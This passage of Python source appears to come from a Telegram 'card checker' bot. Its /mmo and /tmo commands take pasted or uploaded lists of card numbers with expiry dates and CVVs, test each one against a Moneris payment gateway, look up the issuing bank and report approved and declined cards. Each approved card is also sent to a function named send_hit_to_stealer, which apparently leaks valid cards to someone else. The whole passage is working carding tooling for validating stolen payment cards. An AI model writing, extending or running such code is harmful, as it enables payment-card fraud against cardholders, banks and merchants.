        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_moneris_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        # Bold status, no owner line, clickable checked by
        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mmo)
# -------------------------------------------------------------
@Client.on_message(filters.command("mmo", [".", "/"]))
async def moneris_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mmo

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mmo cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tmo)
# -------------------------------------------------------------
@Client.on_message(filters.command("tmo", [".", "/"]))
async def moneris_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tmo

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    # Initial progress message
    progress_text = f"""Moneris
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        status, response = await call_moneris_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Moneris
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    # Send each approved card separately
    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    # Declined summary
    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
